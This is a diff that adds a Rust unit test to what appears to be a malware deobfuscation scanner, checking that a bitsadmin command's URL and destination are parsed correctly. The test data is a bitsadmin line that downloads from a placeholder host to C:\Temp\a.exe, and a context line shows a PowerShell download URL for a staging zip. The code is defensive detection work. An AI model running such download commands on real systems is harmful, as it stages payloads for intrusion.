@@ -10125,6 +10125,26 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn bitsadmin_priority_after_url_in_deob_text_does_not_become_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"bitsadmin /transfer j1 /download https://bits-priority-after.example/a.txt /priority foreground C:\Temp\a.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-priority-after.example/a.txt" && dst == "C:\\Temp\\a.exe"
+            )
+        });
+        assert!(
+            has,
+            "bitsadmin option after URL was treated as destination: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_requests_get_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
